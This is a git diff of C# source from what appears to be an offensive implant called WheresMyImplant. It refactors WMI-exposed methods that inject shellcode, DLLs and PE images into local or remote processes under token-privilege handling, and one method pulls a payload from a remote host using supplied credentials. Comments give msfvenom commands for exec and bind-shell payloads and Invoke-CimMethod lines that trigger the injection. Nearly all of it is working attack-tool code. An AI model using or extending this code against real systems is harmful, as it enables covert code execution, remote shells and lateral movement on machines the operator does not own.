@@ -12,7 +12,7 @@ namespace WheresMyImplant
         [ManagementTask]
         //msfvenom -p windows/x64/exec --format csharp CMD=calc.exe
         //Invoke-CimMethod -Class Win32_Implant -Name InjectShellCode -Argument @{shellCodeString=$payload; processId=432}
-        public static string InjectShellCode(string shellCodeString, String strProcessId)
+        public static string InjectShellCode(String strProcessId, String shellCodeString)
         {
             Int32 dwProcessId = 0;
             if (String.IsNullOrEmpty(strProcessId))
@@ -27,8 +27,11 @@ namespace WheresMyImplant
             {
                 using (InjectShellCodeRemote injectShellCodeRemote = new InjectShellCodeRemote(shellCodeString, (UInt32)dwProcessId))
                 {
-                    injectShellCodeRemote.Execute();
-                    return injectShellCodeRemote.GetOutput();
+                    using (Tokens tokens = new Tokens())
+                    {
+                        injectShellCodeRemote.Execute();
+                        return injectShellCodeRemote.GetOutput();
+                    }
                 }
             }
             else
@@ -38,13 +41,36 @@ namespace WheresMyImplant
         }
 
         [ManagementTask]
-        public static string InjectShellCodeWMIFSB64(String wmiClass, String fileName, Int32 processId)
+        public static string InjectShellCodeWMIFSB64(String processId, String wmiClass, String fileName)
         {
+
             Byte[] peBytes = Misc.QueryWMIFS(wmiClass, fileName);
             String shellCodeString = System.Text.Encoding.Unicode.GetString(peBytes);
 
-            InjectShellCodeRemote injectShellCodeRemote = new InjectShellCodeRemote(shellCodeString, (UInt32)processId);
-            return injectShellCodeRemote.GetOutput();
+            Int32 dwProcessId = 0;
+            if (String.IsNullOrEmpty(processId))
+            {
+                using (InjectShellCode injectShellCode = new InjectShellCode(shellCodeString))
+                {
+                    injectShellCode.Execute();
+                    return injectShellCode.GetOutput();
+                }
+            }
+            else if (Int32.TryParse(processId, out dwProcessId))
+            {
+                using (InjectShellCodeRemote injectShellCodeRemote = new InjectShellCodeRemote(shellCodeString, (UInt32)dwProcessId))
+                {
+                    using (Tokens tokens = new Tokens())
+                    {
+                        injectShellCodeRemote.Execute();
+                        return injectShellCodeRemote.GetOutput();
+                    }
+                }
+            }
+            else
+            {
+                return "Invalid Process ID";
+            }
         }
 
         // Todo: Add Auto Token Privilege Elevation
@@ -52,23 +78,24 @@ namespace WheresMyImplant
         //http://www.codingvision.net/miscellaneous/c-inject-a-dll-into-a-process-w-createremotethread
         //msfvenom -p windows/x64/shell_bind_tcp --format dll --arch x64 > /tmp/bind64.dll
         //Invoke-CimMethod -ClassName Win32_Implant -Name InjectDll -Arguments @{library = "C:\bind64.dll"; processId = 3372}
-        public static String LoadDll(String library, String strProcessId)
+        public static String LoadDll(String processId, String library)
         {
             Int32 dwProcessId = 0;
-            if (String.IsNullOrEmpty(strProcessId))
+            if (String.IsNullOrEmpty(processId))
             {
                 LoadDll injectDll = new LoadDll(library);
                 return injectDll.GetOutput();
             }
-            else if (Int32.TryParse(strProcessId, out dwProcessId))
+            else if (Int32.TryParse(processId, out dwProcessId))
             {
                 String output;
                 using (LoadDllRemote injectDllRemote = new LoadDllRemote(library, (UInt32)dwProcessId))
                 {
-                    UInt32 size = 0;
-                    //Misc.GetModuleAddress("kernel32.dll", (UInt32)dwProcessId, ref size);
-                    injectDllRemote.Execute();
-                    output = injectDllRemote.GetOutput();
+                    using (Tokens tokens = new Tokens())
+                    {
+                        injectDllRemote.Execute();
+                        output = injectDllRemote.GetOutput();
+                    }
                 }
                 return output;
             }
@@ -82,101 +109,40 @@ namespace WheresMyImplant
         //Invoke-CimMethod -ClassName Win32_Implant -Name InjectPE -Arguments @{processId="5648"; fileName="C:\bind64.exe"; parameters=""}
         public static string InjectPE(String processId, String fileName, String parameters)
         {
-            StringBuilder output = new StringBuilder();
-            using (Tokens tokens = new Tokens())
-            {
-                using (PELoader peLoader = new PELoader())
-                {
-                    peLoader.Execute(fileName);
-
-                    Int32 dwProcessId;
-                    try
-                    {
-                        if (!Int32.TryParse(processId, out dwProcessId))
-                        {
-                            InjectPE injectPE = new InjectPE(peLoader, parameters);
-                            output.Append(injectPE.GetOutput());
-                        }
-                        else
-                        {
-                            InjectPERemote injectPE = injectPE = new InjectPERemote((UInt32)dwProcessId, peLoader, parameters);
-                            try
-                            {
-                                injectPE.Execute();
-                            }
-                            catch (Exception error)
-                            {
-                                output.Append(error.ToString());
-                                output.Append("[-] Execution Failed\n");
-                            }
-                            finally
-                            {
-                                output.Append(injectPE.GetOutput());
-                            }
-                        }
-                    }
-                    catch (FormatException error)
-                    {
-                        error = null;
-                        output.Append("[*] Unable to Parse Process ID");
-                        InjectPE injectPE = new InjectPE(peLoader, parameters);
-                        output.Append(injectPE.GetOutput());
-                    }
-                    catch (Exception error)
-                    {
-                        output.Append("[-] Unhandled Exception Occured");
-                        output.Append(error.ToString());
-                    }
-                }
-            }
-            return output.ToString();
-        }
-
-        [ManagementTask]
-        public static string InjectPEString(Int32 processId, String peString, String parameters)
-        {
-            string output = "";
-
             PELoader peLoader = new PELoader();
-            peLoader.Execute(System.Convert.FromBase64String(peString));
-
-            InjectPE injectPE = new InjectPE(peLoader, parameters);
-            output += injectPE.GetOutput();
-            return output;
+            if (!peLoader.Execute(fileName))
+            {
+                return "PELoader Failed";
+            }
+            return _InjectPE(processId, peLoader, parameters);
         }
 
         [ManagementTask]
-        public static string InjectPEWMIFS(Int32 processId, String wmiClass, String fileName, String parameters)
+        public static String InjectPEString(String processId, String peString, String parameters)
         {
-            string output = "";
-
-            Byte[] peBytes = Misc.QueryWMIFS(wmiClass, fileName);
             PELoader peLoader = new PELoader();
-            peLoader.Execute(peBytes);
-
-            InjectPERemote injectPE = new InjectPERemote((UInt32)processId, peLoader, parameters);
-            try
+            if (!peLoader.Execute(System.Convert.FromBase64String(peString)))
             {
-                injectPE.Execute();
+                return "PELoader Failed";
             }
-            catch
-            {
-                output = "[-] Execution Failed\n";
-            }
-            finally
-            {
-                output += injectPE.GetOutput();
-            }
-            return output;
+            return _InjectPE(processId, peLoader, parameters);
         }
 
         [ManagementTask]
-        public static string InjectPEWMIFSRemote(Int32 processId, String wmiClass, String system, String username, String password, String fileName, String parameters)
+        public static string InjectPEWMIFS(String processId, String wmiClass, String fileName, String parameters)
         {
-            StringBuilder output = new StringBuilder();
+            PELoader peLoader = new PELoader();
+            if (!peLoader.Execute(Misc.QueryWMIFS(wmiClass, fileName)))
+            {
+                return "PELoader Failed";
+            }
+            return _InjectPE(processId, peLoader, parameters);
+        }
 
+        [ManagementTask]
+        public static string InjectPEWMIFSRemote(String processId, String wmiClass, String system, String username, String password, String fileName, String parameters)
+        {
             ConnectionOptions options = new ConnectionOptions();
-
             options.Username = username;
             options.Password = password;
 
@@ -202,19 +168,60 @@ namespace WheresMyImplant
 
             Byte[] peBytes = System.Convert.FromBase64String(EncodedText);
             PELoader peLoader = new PELoader();
-            peLoader.Execute(peBytes);
-            InjectPERemote injectPE = new InjectPERemote((UInt32)processId, peLoader, parameters);
+            if (!peLoader.Execute(peBytes))
+            {
+                return "PELoader Failed";
+            }
+            return _InjectPE(processId, peLoader, parameters);
+        }
+
+        [ManagementTask]
+        private static String _InjectPE(String processId, PELoader peLoader, String parameters)
+        {
+            StringBuilder output = new StringBuilder();
+            output.Append(peLoader.GetOutput());
+            output.Append("\n");
+
+            Int32 dwProcessId;
             try
             {
-                injectPE.Execute();
+                if (!Int32.TryParse(processId, out dwProcessId))
+                {
+                    InjectPE injectPE = new InjectPE(peLoader, parameters);
+                    output.Append(injectPE.GetOutput());
+                }
+                else
+                {
+                    InjectPERemote injectPE = injectPE = new InjectPERemote((UInt32)dwProcessId, peLoader, parameters);
+                    try
+                    {
+                        using (Tokens tokens = new Tokens())
+                        {
+                            injectPE.Execute();
+                        }
+                    }
+                    catch (Exception error)
+                    {
+                        output.Append(error.ToString());
+                        output.Append("[-] Execution Failed\n");
+                    }
+                    finally
+                    {
+                        output.Append(injectPE.GetOutput());
+                    }
+                }
             }
-            catch
+            catch (FormatException ex)
             {
-                output.Append("[-] Execution Failed\n");
-            }
-            finally
-            {
+                output.Append("[-] Unable to Parse Process ID");
+                output.Append(String.Format("[-] {0}", ex.Message));
+                InjectPE injectPE = new InjectPE(peLoader, parameters);
                 output.Append(injectPE.GetOutput());
+            }
+            catch (Exception ex)
+            {
+                output.Append("[-] Unhandled Exception Occured");
+                output.Append(ex.Message);
             }
             return output.ToString();
         }
